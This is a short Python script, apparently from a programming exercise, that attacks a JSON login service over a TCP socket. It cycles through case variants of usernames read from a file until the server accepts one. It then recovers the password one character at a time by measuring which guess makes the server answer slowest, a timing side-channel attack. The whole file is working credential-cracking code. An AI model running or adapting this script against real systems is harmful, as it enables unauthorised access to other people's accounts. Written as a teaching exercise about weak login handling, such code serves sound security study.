import sys
import os
import socket
import string
import itertools
import json
from datetime import datetime, timedelta

PROJECT_FILES_DIR = os.getenv('PROJECT_FILES')
password_chars = string.ascii_letters + string.digits


def logins_reader():
    with open(f'{PROJECT_FILES_DIR}/logins.txt', 'r') as file:
        for line in file:
            yield line.strip()


def login_generator():
    gen = logins_reader()
    for login_prototype in gen:
        yield login_prototype
        if login_prototype.isdecimal():
            continue
        login_chars_dict = [{letter.lower(), letter.upper()} for letter in login_prototype]
        for possible_login in itertools.product(*login_chars_dict):
            if possible_login == login_prototype:
                continue
            yield ''.join(possible_login)


def password_generator():
    yield from password_chars


if sys.argv and len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip, port))

        possible_login_gen = login_generator()
        request_body = {
            "login": '',
            "password": ''
        }
        response_body = {
            "result": 'Wrong login!'
        }
        while response_body["result"] == "Wrong login!":
            request_body["login"] = next(possible_login_gen)
            s.send(json.dumps(request_body).encode())
            response_body = json.loads(s.recv(1024).decode())
        found = False
        while response_body["result"] != "Connection success!":
            request_body["password"] += ' '
            max_time_letter = None
            max_time_value = timedelta()
            for letter in password_chars:
                request_body["password"] = request_body["password"][:-1] + letter
                t1 = datetime.now()
                s.send(json.dumps(request_body).encode())
                response_body = json.loads(s.recv(1024).decode())
                t2 = datetime.now()
                if response_body["result"] == "Connection success!":
                    found = True
                    break
                delta = t2 - t1
                if delta > max_time_value:
                    max_time_letter = letter
                    max_time_value = delta
            if found:
                break
            request_body["password"] = request_body["password"][:-1] + max_time_letter

        print(json.dumps(request_body))
